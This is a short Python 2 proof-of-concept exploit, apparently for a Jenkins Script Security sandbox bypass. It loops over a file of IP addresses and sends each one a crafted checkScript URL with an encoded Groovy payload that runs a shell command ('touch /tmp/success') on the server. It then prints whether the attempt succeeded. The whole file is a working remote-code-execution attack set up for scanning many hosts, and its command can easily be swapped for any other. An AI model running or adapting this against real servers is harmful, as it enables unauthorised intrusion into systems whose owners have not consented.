
import sys
import requests

banner = '''
CMD = touch /tmp/success
'''
print banner

def exp(ip):
    vuln_url = "http://" + ip + r'/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public%20class%20x%20{%20%20public%20x(){%20%20%20%20%22touch%20/tmp/success%22.execute()%20%20}}'

    r = requests.get(vuln_url)
    try:
        if r.status_code == 200:
            print 'Version= %s\n' % r.headers['Server']
            
            print "Poc Send Success!\n"
            print '>>>Vuln_URL= ' + vuln_url
        else:
            print "No Exit!"        
    except Exception as e:
        pass


if __name__ == '__main__':
    if not len(sys.argv) == 2:
        print "\nUsage: python %s ip.txt\n" % sys.argv[0]
        exit()
    else:
        filename = sys.argv[1]
        file = open("%s"% filename).readlines()
        for i in file:
            ip = i.split('\n')[0]
            # print ip
            exp(ip)


